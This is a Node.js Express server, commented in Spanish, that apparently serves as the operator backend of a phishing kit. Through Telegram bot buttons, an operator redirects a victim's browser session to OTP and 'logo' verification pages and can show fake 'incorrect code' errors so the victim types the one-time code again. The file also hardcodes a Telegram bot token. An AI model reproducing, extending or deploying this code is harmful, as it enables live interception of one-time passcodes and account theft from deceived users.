const express = require('express');
const cors = require('cors');
const app = express();

const PORT = process.env.PORT || 5000;

app.use(cors());
app.use(express.json());

// ============================================================
// ALMACENAMIENTO DE SESIONES (Temporal)
// ============================================================
const sessionData = {};

// ============================================================
// ENDPOINT 1: REDIRECCIONES (Usado por waiting.js)
// ============================================================
app.get('/get-redirect/:sessionId', (req, res) => {
  const sessionId = req.params.sessionId;
  const session = sessionData[sessionId] || {};

  console.log(`[GET /get-redirect] ${sessionId}:`, session);

  res.json({
    action: session.action || null,
    target: session.target || null,
    error: session.error || null,
    errorType: session.errorType || null
  });
});

// ============================================================
// ENDPOINT 2: RECIBIR CALLBACKS DE BOTONES (NUEVO)
// ============================================================
app.post('/telegram-callback', (req, res) => {
  const { sessionId, action } = req.body;

  if (!sessionId || !action) {
    return res.status(400).json({ error: 'Parámetros faltantes' });
  }

  console.log(`[Callback] ${sessionId}: ${action}`);

  // Mapeo de acciones a redirecciones
  const actionMap = {
    'action_otp': {
      action: 'OTP',
      target: 'otp-check.html',
      errorType: null,
      error: null
    },
    'action_otp_error': {
      action: 'OTP_ERROR',
      target: 'otp-check.html',
      errorType: 'otp',
      error: 'Código incorrecto, intenta nuevamente'
    },
    'action_logo': {
      action: 'LOGO',
      target: 'logo-check.html',
      errorType: null,
      error: null
    },
    'action_logo_error': {
      action: 'LOGO_ERROR',
      target: 'logo-check.html',
      errorType: 'logo',
      error: 'Verificación fallida, intenta nuevamente'
    },
  };

  const mapping = actionMap[action];
  if (!mapping) {
    return res.status(400).json({ error: 'Acción desconocida' });
  }

  // Guardar en sesión
  if (!sessionData[sessionId]) {
    sessionData[sessionId] = {};
  }

  sessionData[sessionId] = {
    ...sessionData[sessionId],
    ...mapping,
    updatedAt: Date.now()
  };

  console.log(`[Sesión Actualizada]`, sessionData[sessionId]);

  res.json({
    success: true,
    message: 'Acción procesada',
    sessionId,
    action: mapping.action
  });
});

// ============================================================
// ENDPOINT 3: WEBHOOK DE TELEGRAM
// ============================================================
const BOT_TOKEN = '8499803362:AAHxkqI11-YbYgHvjQZf3l7EkpTHanKOe14';

app.post('/telegram-webhook', async (req, res) => {
  const update = req.body;

  if (update.callback_query) {
    const { id, data, message } = update.callback_query;

    // Responder al callback para quitar el loading del botón
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: id })
    }).catch(() => {});

    // Extraer sessionId del texto del mensaje
    const sessionIdMatch = message?.text?.match(/sessionId[:\s]+(\S+)/);
    const sessionId = sessionIdMatch?.[1];

    console.log(`[Webhook] callback: ${data}, sessionId: ${sessionId}`);

    if (sessionId && data) {
      const actionMap = {
        'action_otp':       { action: 'OTP',        target: 'otp-check.html',  error: null,                           errorType: null  },
        'action_otp_error': { action: 'OTP_ERROR',   target: 'otp-check.html',  error: 'Código incorrecto',            errorType: 'otp' },
        'action_logo':      { action: 'LOGO',        target: 'logo-check.html', error: null,                           errorType: null  },
        'action_logo_error':{ action: 'LOGO_ERROR',  target: 'logo-check.html', error: 'Verificación fallida',         errorType: 'logo'},
      };

      const mapping = actionMap[data];
      if (mapping) {
        sessionData[sessionId] = { ...mapping, updatedAt: Date.now() };
        console.log(`[Webhook] Sesión ${sessionId} → ${mapping.action}`);
      }
    }
  }

  res.json({ ok: true });
});

// ============================================================
// ENDPOINT 4: HEALTHCHECK
// ============================================================
app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    uptime: process.uptime()
  });
});

// ============================================================
// LIMPIEZA DE SESIONES ANTIGUAS
// ============================================================
setInterval(() => {
  const now = Date.now();
  const TIMEOUT = 3600000; // 1 hora

  for (const id in sessionData) {
    if (now - (sessionData[id].updatedAt || 0) > TIMEOUT) {
      delete sessionData[id];
      console.log(`[Limpieza] Sesión eliminada: ${id}`);
    }
  }
}, 300000); // Cada 5 minutos

// ============================================================
// INICIAR SERVIDOR
// ============================================================
app.listen(PORT, () => {
  console.log(`
╔════════════════════════════════════════════╗
║  🚀 SERVIDOR BACKEND ACTIVO               ║
╚════════════════════════════════════════════╝

Puerto: ${PORT}
Endpoints:
  ✓ GET  /get-redirect/:sessionId
  ✓ POST /telegram-callback
  ✓ POST /telegram-webhook
  ✓ GET  /health

Ambiente: ${process.env.NODE_ENV || 'development'}
  `);
});

module.exports = app;
